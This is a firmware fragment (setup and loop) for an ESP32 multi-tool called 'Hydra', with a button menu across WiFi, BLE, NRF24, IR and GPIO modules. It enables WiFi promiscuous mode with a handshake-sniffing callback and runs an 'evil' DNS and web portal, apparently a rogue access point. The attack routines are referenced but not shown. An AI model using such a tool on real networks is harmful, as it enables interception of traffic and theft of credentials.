void setup() {
    Serial.begin(115200);
    
    // Піни кнопок
    pinMode(BTN_UP, INPUT_PULLUP);
    pinMode(BTN_DOWN, INPUT_PULLUP);
    pinMode(BTN_OK, INPUT_PULLUP);
    pinMode(BTN_LEFT, INPUT_PULLUP);
    pinMode(BTN_RIGHT, INPUT_PULLUP);
    pinMode(BTN_BACK, INPUT_PULLUP);
    
    // I2C дисплей
    Wire.begin(I2C_SDA, I2C_SCL);
    u8g2.begin();
    u8g2.setContrast(200);
    
    // Завантаження даних
    loadData();
    uptimeStart = millis();
    
    // Анімація логотипу Hydra
    for (int a = 255; a >= 0; a -= 15) {
        u8g2.clearBuffer();
        u8g2.drawXBM(32, 0, 64, 64, hydra_logo);
        u8g2.setContrast(a);
        u8g2.sendBuffer();
        delay(20);
    }
    u8g2.setContrast(200);
    delay(500);
    
    // Ініціалізація
    WiFi.mode(WIFI_AP_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(handshakeSniffer);
    
    // NRF24
    SPI.begin(18, 19, 23, NRF_CSN);
    radio.begin();
    
    drawMainMenu();
    showMessage("READY", 1000);
}

void loop() {
    if (webRunning) server.handleClient();
    if (evilActive) { dnsServer.processNextRequest(); server.handleClient(); }
    
    lastRSSI = WiFi.RSSI();
    
    if (!inSubMenuFlag) {
        if (checkButton(BTN_LEFT)) {
            currentModule = (currentModule - 1 + 7) % 7;
            drawMainMenu();
        } else if (checkButton(BTN_RIGHT)) {
            currentModule = (currentModule + 1) % 7;
            drawMainMenu();
        } else if (checkButton(BTN_OK) || checkButton(BTN_DOWN)) {
            inSubMenuFlag = true;
            currentSubIndex = 0;
            subScroll = 0;
            drawSubMenu();
        }
    } else {
        int size;
        switch (currentModule) {
            case 0: size = wifiSize; break;
            case 1: size = bleSize; break;
            case 2: size = nrfSize; break;
            case 3: size = irSize; break;
            case 4: size = gpioSize; break;
            case 5: size = gamesSize; break;
            default: size = configSize; break;
        }
        
        if (checkButton(BTN_UP)) {
            currentSubIndex = (currentSubIndex - 1 + size) % size;
            drawSubMenu();
        } else if (checkButton(BTN_DOWN)) {
            currentSubIndex = (currentSubIndex + 1) % size;
            drawSubMenu();
        } else if (checkButton(BTN_OK)) {
            executeAction();
            drawSubMenu();
        } else if (checkButton(BTN_BACK)) {
            inSubMenuFlag = false;
            drawMainMenu();
        }
    }
    delay(20);
}
